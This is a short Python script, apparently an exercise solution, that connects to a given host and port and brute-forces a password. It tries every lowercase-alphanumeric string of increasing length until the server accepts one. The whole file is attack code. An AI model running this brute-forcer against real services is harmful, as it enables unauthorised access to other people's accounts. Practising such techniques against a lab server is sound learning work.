# write your code here
import argparse
import socket
import itertools

alp = 'abcdefghijklmnopqrstuvwxyz0123456789'
numb = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]

j = 0
length = 1

parser = argparse.ArgumentParser(description='server client connection')

parser.add_argument('host')
parser.add_argument('port', type=int)
args = parser.parse_args()

address = (args.host, args.port)

with socket.socket() as client_socket:
    client_socket.connect(address)
    for z in range(1000000):
        for x in itertools.product(alp, repeat=length):
            # pswd.append(x)
            data = str(''.join(x))
            en_data = data.encode()
            client_socket.send(en_data)
            response = client_socket.recv(1024)
            response = response.decode()
            if response == 'Connection success!':
                print(data)
                exit()
            elif response == 'Wrong password!':
                continue
            elif response == 'Too many attempts':
                exit()
            j += 1
        if j % 36 == 0:
            length += 1
